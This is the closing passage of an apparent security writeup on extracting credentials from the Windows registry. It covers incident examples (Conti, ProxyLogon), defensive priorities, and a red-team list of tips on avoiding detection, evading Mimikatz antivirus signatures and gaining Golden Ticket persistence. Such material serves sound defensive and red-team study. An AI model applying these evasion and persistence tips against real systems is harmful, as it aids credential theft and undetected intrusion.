- **Impact:** $2.7 billion in estimated losses across 1000+ victim organizations.
- **Reference:** [FBI Alert - Conti Ransomware](https://www.fbi.gov/news/stories/conti-ransomware-gang-targets-healthcare-sector)

#### Example 3: ProxyLogon / Microsoft Exchange Exploitation (2021)

- **Target:** Organizations running on-premises Microsoft Exchange Server
- **Timeline:** January 2021 - March 2021
- **Technique Status:** Initial RCE via ProxyLogon (CVE-2021-26855) → privilege escalation → registry hive extraction via local user context.
- **Impact:** 30,000+ organizations compromised within 60 days; used as entry point for Hafnium (Chinese APT) targeting law firms, defense contractors.
- **Reference:** [CISA ProxyLogon Advisory](https://www.cisa.gov/news-events/alerts/2021/03/08/cisa-orders-federal-agencies-patch-critical-microsoft-exchange-server)

---

## 12. CONCLUSION

Registry credential extraction is a **high-confidence, post-exploitation technique** that requires Local Admin or SYSTEM privileges but yields immediate, plaintext (or quickly crackable) credentials. The technique is **ACTIVE** on all Windows platforms and remains a critical attack vector despite modern defenses like Credential Guard.

**Key Defense Priorities:**
1. **Credential Guard** deployment on Windows 10+/Server 2022+ (eliminates LSA secret extraction)
2. **Restrict registry hive file access** via NTFS permissions and audit policies
3. **Monitor registry access events** (Event ID 4663) in real-time via SIEM
4. **Enforce strong password policies** and MFA to reduce impact of extracted credentials
5. **Implement Just-In-Time (JIT) access** to limit Local Admin availability

**Operational Notes for Red Teams:**
- Registry extraction requires offline analysis (copy hives, analyze elsewhere) to avoid real-time detection.
- Credential Guard blocks LSA secret extraction; target cached domain credentials instead.
- Use custom Python scripts to evade Mimikatz-specific antivirus signatures.
- Combine with Golden Ticket creation for long-term domain persistence.

---